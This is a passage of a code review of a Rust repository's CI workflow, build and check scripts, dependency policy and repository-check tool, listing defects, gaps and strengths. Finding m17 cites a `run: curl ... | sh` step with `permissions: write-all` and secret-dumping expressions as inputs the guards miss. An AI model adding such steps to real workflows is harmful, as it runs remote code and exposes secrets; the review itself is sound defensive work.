**Suggested fix**: In the base path, keep `Ok(None)` (the file is absent at the base) apart from `Err`, and record the error as a fault, so the run ends with exit 3. Add a test with a base commit whose owner file is not UTF-8, which today exits 0.

## Minor

Each one is real and none blocks. They are grouped by owner.

### Remote proof and spec text (spec owner)

### 🟡 m1. Three commands will not show what "Expected" says, `docs/specs/0002-standards-and-tooling/index.md:844`, `:883`, `:896`
**Problem**: `gh pr checks --watch` right after `gh pr create` can exit with "no checks reported" before a run is registered (steps 2 and 5). In step 5, `gh pr close --delete-branch` already switches away and deletes the local branch, so the `git branch -D` after it fails with "branch not found". In step 6, `gh run list` right after the merge shows a run that has not finished, so `success` cannot be read from it.
**Why it matters**: All three fail without harm, but a person who runs a block with `set -e` stops early, and the recorded output does not match the spec.
**Suggested fix**: Wait for the run first (`gh run watch <id> --exit-status`), drop the `git branch -D` line or let it fail quietly, and watch the push run in step 6 before listing it. Reasoned, not run.

### 🟡 m2. The undo paragraph understates what changed, `docs/specs/0002-standards-and-tooling/index.md:903`
**Problem**: It says nothing else changed on the remote except two branches and two pull requests. Step 6 also adds a merge commit to `main`, and the scope branch stays on the remote (`delete_branch_on_merge` is false, read live). `$R` is set only inside the step 1 block, so the undo command in a new shell calls `repos//rulesets`.
**Suggested fix**: Name the merge commit and the branch that stays, and repeat the `R=` line in the undo.

### 🟡 m3. The evidence is older than the tree that will be pushed, `docs/specs/0002-standards-and-tooling/verify.md:263` and `:530`
**Problem**: The full verify and step 10 ran on `f58885f` and `535bd15`. After that came `ae6a77b` (105 integration tests, while `verify.md` still says 71) and `0e68e2a` (a change to the `--base` path that proof case 19 and the CI `docs` job use). No recorded `scripts/prove-checks.sh` run covers the tree that remote step 2 will push.
**Suggested fix**: Extend the condition before step 11 to include `scripts/prove-checks.sh` on that `main`, and record the revision and the test count.

### 🟡 m4. Stale sentence, `docs/research/technology-evaluation.md:102`
**Problem**: "The versions the developer observes in the real build are added below when the build is done." They have been added.
**Suggested fix**: Say that the observed versions are listed at the end of the section.

### 🟡 m5. The unsafe rule is stated with no exception, `docs/engineering-standards.md:9`
**Problem**: "First party crates forbid unsafe code." Spec 0002 makes `crates/pool-config/fuzz/` the one place where the `unsafe_code` rule does not apply, and that package has no `[lints]` table. The owner of the rule does not name the exception.
**Suggested fix**: Add one clause that names the fuzz packages outside the workspace and links the fuzz harness section.

### 🟡 m6. The agent guides are behind the tree, `AGENTS.md:3` and `:8`, `crates/pool-config/AGENTS.md:7`
**Problem**: The root guide still says the user asked for "nothing beyond" scope 001 and that "there is no CI yet". It names neither `scripts/check.sh` nor the pull request path. Once the rule is active, an agent that follows it will plan a direct push. The `pool-config` guide does not mention the fuzz package that calls `validate` and `config_version`, which no required check compiles. (Outside this slice: the root `CLAUDE.md` says the same about CI.)
**Why it matters**: The spec leaves `AGENTS.md` to the sync step, so this is expected today. It is listed so that the sync step does not miss it.
**Suggested fix**: In the sync step, replace the two sentences, add one line on the pull request path and `scripts/check.sh <name>`, and add a gotcha to the `pool-config` guide: changing `validate` means running `scripts/check.sh fuzz`.

### Scripts and policy (owner `dev-f2-build`)

### 🟡 m7. A failing `git` is not noticed, `scripts/linux-build.sh:11` and `:16`
**Problem**: `[ -n "$(git status --porcelain)" ]` is false when `git status` itself fails, so the tree counts as clean. The pipeline `git archive ... | docker run ...` runs without `pipefail`, so a failing `git archive` is ignored.
**Why it matters**: The inner script then fails on an empty archive, so there is no false pass in the real run. The check reports "failed" (exit 1) with a container error, where the contract says "could not run" (exit 3). Git's "dubious ownership" refusal is a real trigger.
**Evidence**: Reproduced with a stub `docker` outside a repository: 0 bytes reached `docker run` and the script exited 0.
**Suggested fix**: Before the marker, run `git rev-parse --verify -q HEAD` as its own statement and exit 3 when it fails, and test the status of `git status` apart from its output. The lines before the marker belong to spec 0002.

### 🟡 m8. `check_sbom` leaves files in the tree when the tool fails, `scripts/check.sh:179`
**Problem**: `run cargo cyclonedx ... || return 1` returns before the cleanup at line 182. The `find` at line 182 is not under `run`, so if it fails the check still prints `== ok: sbom`.
**Why it matters**: A leftover `pool.cdx.json` makes `linux-build` exit 3 ("commit or remove local changes") with no hint where the file came from.
**Evidence**: Reproduced with a stub `cargo`. Already listed as open in the verify record.
**Suggested fix**: Remember the status of the tool, always run the cleanup, then return.

### 🟡 m9. An exported `CDPATH` or `GIT_DIR` sends the scripts elsewhere, `scripts/check.sh:27`, `scripts/linux-build.sh:5`, `scripts/prove-checks.sh:23` (owner of the last: `dev-f2-audit`)
**Problem**: `cd "$(dirname "$0")/.."` with the documented call `scripts/check.sh <name>` becomes `cd scripts/..`, which a POSIX shell looks up through an exported `CDPATH`. In `prove-checks.sh`, an exported `GIT_DIR` (Git sets it for hooks and for `git rebase --exec`) wins over `git -C "$COPY"`, so the commit of case 20 lands in the repository the script was started from. The commit in case 20 also does not switch off signing or hooks from the user's global Git settings.
**Evidence**: Reproduced on scratch copies under bash 3.2 and `dash` (`CDPATH`), and on a stand in script with the same Git lines (`GIT_DIR`). The real `prove-checks.sh` was not run.
**Why it matters**: `prove-checks.sh` promises that it never changes the tree it was started from. That holds in a normal shell. No way was found to lose work that was not committed.
**Suggested fix**: `CDPATH= cd -- "$(dirname -- "$0")/.."` in all three, `unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE` near the top of `prove-checks.sh`, and `-c commit.gpgsign=false -c core.hooksPath=/dev/null` on its commit.

### 🟡 m10. Unsound advisories on indirect dependencies do not fail `deny`, `deny.toml:4`
**Problem**: `[advisories]` sets `unmaintained = "all"` but has no `unsound` key. In `cargo-deny` 0.20.2 the default is `workspace`, so an unsoundness advisory fails only for a direct dependency.
**Why it matters**: The spec says a known problem fails "for direct and indirect dependencies alike". For a project whose rule is safe first party Rust, unsoundness reports are the class it most wants to see. Nothing in the locked packages is affected today.
**Evidence**: The key and its values were confirmed with the installed binary. The default was read from the `cargo-deny` book, not from a run.
**Suggested fix**: Add `unsound = "all"`, in spec 0002 and in the file. It is a policy change, so the spec owner decides.

### 🟡 m11. Half of the dependency policy has no proving case, `deny.toml:22`
**Problem**: `scripts/prove-checks.sh` proves `deny` with a license, one advisory and a stale lockfile. Nothing shows that a Git source, another registry, a wildcard, a duplicate, a yanked version or an unmaintained package fails. The same is true for rules C3, C4, C5, W6 and D4, which the proof table in the spec does not list.
**Why it matters**: `0002 AC-11` exists so that a green result means something. A later edit that sets `unknown-git` back to its default would pass every check.
**Suggested fix**: Add at least one sources case and one bans case to the spec table and the script. Both can run offline.

### The repository check program (owner `dev-f2-audit`)

### 🟡 m12. The `--base` value reached `git` as an option, `tools/repo-check/src/tree.rs:129`
**Problem**: The revision stood before `--`, so a value that starts with a hyphen was read by `git` as an option. Four option values were tried, all ended in exit 3, and no file was written. It was safe by luck.
**State after the range**: Closed by `0e68e2a` (the revision is resolved with `--end-of-options` first). The test marked "Gap" for it may need to be turned around.

### 🟡 m13. A comment in a manifest gives a false alarm or a wrong message, `tools/repo-check/src/text.rs:59` and `tools/repo-check/src/workspace.rs:164`
**Problem**: `workspace = true # inherit`, `[lints] # inherit` and `unsafe_code = "forbid" # reason` are all reported as W4 with a text that says the `[lints]` table is missing. In the `members` array every quoted text counts, also inside a comment, which ends in exit 3 for a path that does not exist.
**Why it matters**: It fails closed, but it blocks an honest edit and points the reader the wrong way.
**Evidence**: Reproduced (exit 1, exit 1, exit 3).
**Suggested fix**: One helper that cuts a `#` comment outside quotes, shared with the fix for M3.

### 🟡 m14. W4 checks only the members written in the `members` array, `tools/repo-check/src/workspace.rs:193`
**Problem**: Cargo also treats a path dependency inside the workspace folder as a member, and a root manifest with a `[package]` table is a member too. W4 and W5 look at neither.
**Evidence**: Reproduced: a new `crates/extra` with no `[lints]` table and an `unsafe` block, used as a path dependency, passes `workspace` once its name is in the baseline, and `cargo metadata` lists it as a member.
**Why it matters**: `unsafe_code = "forbid"` does not reach such a crate. W1 makes the new name visible, so a reviewer can still see it.
**Suggested fix**: Report as W4 any `[[package]]` entry of the root `Cargo.lock` with no `source` line that is not a listed member. Raise it with the spec owner before the slice that adds a third crate.

### 🟡 m15. W3 has three quiet ways around it, `tools/repo-check/src/workspace.rs:119`
**Problem**: A folder named `target` is skipped at any depth, also a module folder such as `src/target/`. A grouped import (`use std::{io, thread};`) contains no `std::thread`. A `.rs` file that is a symbolic link is not read.
**Evidence**: Reproduced, exit 0 for each.
**Why it matters**: The grouped import is a spelling people write every day. The first two follow the spec word for word, so they are for the spec owner.
**Suggested fix**: Skip `target` only next to a `Cargo.toml`. Either add `thread::` and `net::` to the baseline or say in the spec that W3 is a tripwire and review is the guard.

### 🟡 m16. C5 accepts more permissions after a blank line or a comment, `tools/repo-check/src/ci.rs:249`
**Problem**: `nothing_more` looks only at the one line after `  contents: read`. A blank line or a comment line there ends the test, and a further key such as `  id-token: write` is not seen.
**Evidence**: Reproduced, exit 0.
**Suggested fix**: Walk on over blank and comment lines and fail on the first indented line.

### 🟡 m17. The CI guards do not require the fixed shape they rely on, `tools/repo-check/src/ci.rs:34` and `:46`
**Problem**: All of these pass today.
- A second workflow file with `permissions: write-all` and `run: curl ... | sh`. Only C1 and two words of C5 read other files.
- `${{ secrets['X'] }}` and `${{ toJSON(secrets) }}`.
- A quoted key (`- "run": ...`), flow style (`- {run: "..."}`) and a space before the colon.
- `name:` on a job or a matrix. The check name GitHub reports is then no longer the job id, C2 still passes, and every pull request waits for a check that never reports. It fails closed, but the cause is hard to see.
- The `on:` block is not read, so removing `schedule:` drops the daily advisory run without a word.
- In `main.json` only the `"context"` values are read, so `"enforcement": "disabled"` or a bypass actor passes.
- A job without `runs-on:` passes C4. GitHub refuses such a workflow, so this one is harmless.

**Why it matters**: Each item alone is small or needs intent. Together they show that the line rules hold only while the files keep the shape of the spec, and nothing checks that shape.
**Suggested fix**: The comparison with the spec blocks proposed in M4 closes all of them. If that is not wanted: one rule that `ci.yml` is the only file under `.github/workflows/` until a spec adds another.

### 🟡 m18. Symbolic links are skipped without a message, `tools/repo-check/src/tree.rs:69`
**Problem**: The walk keeps only real files and folders. A linked `.rs` file (W3), a linked `Cargo.lock` (W6) and a linked `.md` file (D1 to D5) are not checked, and a dangling link at a forbidden path passes W2.
**Evidence**: Reproduced, exit 0 for each.
**Suggested fix**: Report a symbolic link under a walked folder as a problem of the rule that walks. Not needed before merge.

### 🟡 m19. The Markdown reader differs from GitHub in a few places, `tools/repo-check/src/docs.rs:156` and `:207`
**Problem**: False alarms on valid input: a heading written with an underline, a heading indented by up to three spaces, `_emphasis_` in a heading, an `<a id>` anchor, a target with `?plain=1`. Misses: a relative target such as `README.md:12` is taken for a scheme, a link split over two lines is not seen, and a line of four or more spaces and three backticks opens a fence, so with no closing line the rest of the file is not checked.
**Why it matters**: The committed documents use none of these forms.
**Suggested fix**: Require a scheme to be followed by `//` or to be `mailto:`, limit the fence indent to three spaces, and list the heading forms that are not supported in the spec. Not needed before merge.

### Tests (owner `tst-f2-test`)

### 🟡 m20. The `scripts/check.sh` tests never assert which commands a check runs, `tools/repo-check/tests/repo_check/check_script.rs:143`
**Problem**: The stub `cargo` logs every call, but only two tests read the log. The passing test and both `all` tests would still pass if every `check_<name>` function had an empty body.
**Why it matters**: Dropping the second `cargo clippy` line or the `--locked` flag leaves this suite and CI green.
**Suggested fix**: Compare the logged calls for each of the six names with the command lines of the spec table.

### 🟡 m21. Entry point paths with no automated test, `tools/repo-check/tests/repo_check/check_script.rs:38`
**Problem**: Not covered: `linux-build` (a missing `docker`, exit 3 from the build script), `tools` (nothing to do, an install, a failed install as exit 3), `fuzz`, `sbom`, the `origin/main` fallback of `docs` (the stub `git` always exits 1, and this is the path the daily run takes), the environment defaults, "may be called from any directory", and everything in `scripts/linux-build.sh`.
**Why it matters**: These branches decide between exit 1 and exit 3, and between a pass and a skip. Findings m7 and m8 sit in exactly these branches.
**Suggested fix**: A `STUB_GIT_OK` switch, a stub `docker`, and one test for each item.

### 🟡 m22. Nine tests pin a hole as the expected result, marked only by a comment, `tools/repo-check/tests/repo_check/main.rs:5`
**Problem**: Nine tests assert a pass on an input the rule is meant to stop, each with `// Gap:` in a comment (`workspace.rs:203`, `:273`, `ci.rs:185`, `:207`, `:264`, `:277`, `docs.rs:294`, `:619`, `:648`). They are honest. Three things are missing: the mark is not visible in the test name or the output, one more pinned difference has no mark (`workspace.rs:358`, a W7 message without `scripts/linux-build.sh`), and two holes are written down nowhere but in a test comment.
**Why it matters**: A pinned defect that looks like a normal passing test tends to become the rule. Each fix above has to turn its test around.
**Suggested fix**: Give the names a `gap_` prefix, say in each whether it follows the spec or is a defect, and list them once in the spec Follow-up or in `verify.md`.

### 🟡 m23. Smaller gaps in the suite, `tools/repo-check/tests/repo_check/ci.rs:139`, `:151`, `:216`, `docs.rs:286`, `cli.rs:84`
**Problem**:
- No test uses a `run:` value with the allowed prefix and more shell text (see M4).
- No test removes the `permissions:` block. The code does handle that case.
- Some substring matches do not prove their claim: `"deny"` also matches `cargo-deny`, and `"Cargo.lock"` matches all three lockfiles.
- `docs.rs:286` returns early as root and is counted as passed. It is the only silent skip.
- Two tests in `cli.rs` read the developer's working tree of this repository, so a draft with a broken link fails `cargo test`.
- A rare "Text file busy" failure is possible on Linux, because stubs are written and then run while other threads spawn processes (`check_script.rs:75`). It was not observed, and the suite has no Linux run yet.

**Suggested fix**: One test for each of the first two, a path argument for `Outcome::has`, a visible skip, a fixture for the default root test. Nothing is needed for the last one unless it shows.

## Nits

- ⚪ `docs/specs/0002-standards-and-tooling/index.md:826`, `$R` is used in the "Before" sentence ahead of the block that sets it.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:835`, `gh api --jq` prints an object over several lines on a terminal, so `"name":"main"` may show with a space.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:874`, the line added in step 5 also fails `clippy` (a function that is never used), so the blocked state is not caused by `fmt` alone. `0002 AC-12` is still met as worded.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:875`, the commit in step 5 skips the graph rule of `AGENTS.md`. One sentence that it is exempt because it is never merged would help.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:1109`, "runs ... on every pull request from now on" is true only after remote step 2.
- ⚪ `docs/specs/0002-standards-and-tooling/index.md:650`, if the repository ever becomes private, `ubuntu-24.04-arm` is no longer a free standard runner and every required check would wait without end. One line would warn the person who makes that change.
- ⚪ `docs/repository-structure.md:7`, the layout lists `scripts/` and `tools/repo-check/` but not `crates/pool-config/fuzz/`.
- ⚪ `docs/engineering-standards.md:68` and `CONTRIBUTING.md:17` keep "protected main" and "branch protection" until item 12. The glossary says to avoid that name, so switch both to "branch rule" then.
- ⚪ `scripts/check.sh:162`, `POOL_FUZZ_SECONDS=0` or a value that is not a number reaches libFuzzer as no limit, so `fuzz` runs until stopped. Reasoned.
- ⚪ `.github/workflows/ci.yml:29`, `rustup toolchain install` also updates rustup itself, the one tool in CI that is not pinned. `--no-self-update` would fix it, but C3 allows only the exact text.
- ⚪ `scripts/check.sh:87`, a missing `rustfmt` or `clippy` component ends as exit 1, where `0002 AC-1` says a missing tool is exit 3.
- ⚪ `scripts/check.sh:135`, when no base is known, `docs` runs without `--base` and says nothing about the D6 test it skipped.
- ⚪ `scripts/check.sh:216`, a failed check and one that could not run print the same `== FAILED:` line.
- ⚪ `scripts/check.sh:110`, `deny` reads the product and fuzz lockfiles only. If `tools/repo-check` ever gains a dependency, add a third run in the same change.
- ⚪ `scripts/check.sh:164`, `cargo fuzz run` is not given `--locked`.
- ⚪ `.github/workflows/ci.yml:13`, for pushes to `main` GitHub keeps one waiting run for each group, so of three quick merges the middle run is cancelled while it waits.
- ⚪ `tools/repo-check/src/workspace.rs:319`, when the block under "Linux build" is missing, W7 compares the next fenced block later in spec 0001 and blames `scripts/linux-build.sh:16`. It fails closed.
- ⚪ `tools/repo-check/src/workspace.rs:360`, W7 guards only the lines after the marker, so a line before the marker that prints the pass text and exits 0 goes through. The spec defines W7 this way.
- ⚪ `tools/repo-check/src/docs.rs:427`, an index number too large for `u32` makes the heading test return without a word. Report D3 there.
- ⚪ `tools/repo-check/src/ci.rs:231`, the test for a leading `#` can never be true after `value_of` matched.
- ⚪ `tools/repo-check/src/tree.rs:100`, files are read whole with no size limit. Fine for a tool that reads its own repository.
- ⚪ `scripts/prove-checks.sh:39`, the trap for `INT` and `TERM` removes the temporary folder but does not exit, so the script goes on until the next restore fails.
- ⚪ `scripts/prove-checks.sh:136`, each wanted text is searched anywhere in the output. Matching `^W4: ` would make it exact.
- ⚪ `tools/repo-check/tests/repo_check/common.rs:25`, fixtures are never removed and rest on names written by hand. All names are unique today.
- ⚪ `tools/repo-check/tests/repo_check/common.rs:86`, `git` runs with the developer's global settings. `GIT_CONFIG_GLOBAL=/dev/null` would make the isolation complete.
- ⚪ `tools/repo-check/tests/repo_check/check_script.rs:93`, `0.20.2` is a second copy of the pin that the spec says is written once.

## The fragile points the lead asked about

| Point | Result | Where | Fix now? |
|---|---|---|---|
| A second workflow file is read only by C1 and C5 | Confirmed, exit 0 | m17 | Only if M4 is not fixed by comparing the shape |
| A job without `runs-on:` passes C4 | Confirmed, harmless (GitHub refuses the file) | m17 | No |
| `secrets["X"]` passes C5 | Confirmed, exit 0 | m17 | With M4 |
| `shell:` passes C3 | Confirmed, exit 0 | M4 | Yes |
| W5 misses a renamed dependency | Confirmed, and three more spellings found | M3 | Yes |
| W4 refuses `workspace = true # comment` | Confirmed, a false alarm | m13 | Yes, same helper as M3 |
| `--base` that starts with a hyphen | Confirmed in the range, closed by `0e68e2a` | m12 | Done |
| W7 message when the spec block is missing | Confirmed, fails closed | Nits | No |
| `cd "$(dirname "$0")/.."` with `CDPATH` | Confirmed in all three scripts | m9 | Yes, one line each |
| `check_sbom` leaves files behind | Confirmed | m8 | Yes |
| "are added below when the build is done" | Confirmed stale | m4 | Yes |
| `docs --base` reads the parent repository | Confirmed in the range, closed by `0e68e2a`; the swallowed read error is still open | M5 | Yes, a few lines |

## Strengths

- The branch rule payload is correct and safe to apply. It has four rules, `~DEFAULT_BRANCH`, an empty bypass list, and the parameter names the REST API takes. The seven contexts equal the seven job ids, no job has a `name:` key, and `integration_id` 15368 is the Actions app (read live). The owner can always delete the ruleset, so no step can lock `main` for good.
- The remote is ready: no ruleset, no branch protection, Actions on, public, merge commits allowed, the `gh` token has the `workflow` scope, and the remote `main` is an ancestor of the local `main`.
- CI security is tight: `pull_request` and never `pull_request_target`, a top level `contents: read`, `persist-credentials: false` on every checkout, no secret, both actions pinned to the commit their tag points at (checked live), no `${{ }}` in any `run:` line, a timeout on every job. A pull request from a fork runs the same checks with nothing to steal, and can write only to its own cache scope.
- The runner label is right. `ubuntu-24.04-arm` is a standard hosted label, free for a public repository, and matches the `aarch64-unknown-linux-gnu` target of spec 0001. `scripts/linux-build.sh` after its marker equals the "Linux build" block of spec 0001, and W7 guards the copy. This does answer spec 0001 Follow-up 9.
- `scripts/check.sh` handles `set -e` inside `||` lists correctly, validates every name before it runs anything, never skips a missing tool, and maps exit 0, 1, 2 and 3 as the spec says, with 1 winning over 3.
- `deny.toml` is strict where it speaks: unknown registries and Git sources are denied, three licenses are allowed and an unused one is an error, yanked versions fail, and the ignore list is empty.
- `0001 AC-12` and `0001 AC-13` still hold: 18 packages in the root lockfile, two workspace members, both inherit the lints, and `unsafe_code = "forbid"` stands. The fuzz package is its own workspace with its own lockfile.
- `pool-repo-check` keeps problems and faults apart. Missing, unreadable and non UTF-8 files gave exit 3, and 400 rounds of scrambled Markdown, TOML and YAML for each command gave no panic. `git` is started with an argument list, never through a shell. The output holds no environment value.
- The test suite is careful: every failing case asserts the exit status, the rule ID at the start of a line and the problem count. Git runs with a fixed identity, no hooks and no signing, and no test can write to this repository. The target `tests/repo_check/main.rs` is discovered by Cargo.
- `verify.md` is honest. The four remote items stay `NOT_RUN` with `owner: lead`, and every macOS run is labelled as not Linux and not CI. No name, address or team was invented for the roster or the security channel, and no Pgpool-II parity claim was added.

## Test coverage

A test runner is configured (the built in `cargo test`). Every rule W1 to W7, C1 to C5 and D1 to D6 has at least one failing and one passing integration case, and none has only a happy path test. The command line contract (exit 2, exit 3, the last line) is covered well.

What is not covered:

- For M3: a table header with a comment, a quoted dependency key, a target table for one dependency.
- For M4: `continue-on-error`, `if:`, a continuation line, shell operators in a run value.
- For M5: a failing `git show` at the base.
- For `scripts/check.sh`: which commands each check runs, and the paths in m21.
- For `scripts/linux-build.sh`: everything. Rule W7 ties its second half to spec 0001, nothing tests its first half.
- For `deny.toml`: `[bans]`, `[sources]`, `yanked` and `unmaintained` have no failing input anywhere.
- No required check compiles the fuzz package. The spec names and accepts this.
- Nothing has run on a GitHub runner or on Linux yet. Remote step 2 is the first real evidence for the runner label, the `rustup` form on the runner, the cache step and the ARM image.

The suite is recorded as green on the macOS workstation with 105 integration tests in the coordination log. This review did not run `cargo test`. It built `pool-repo-check` once and ran it on copies of the tree.
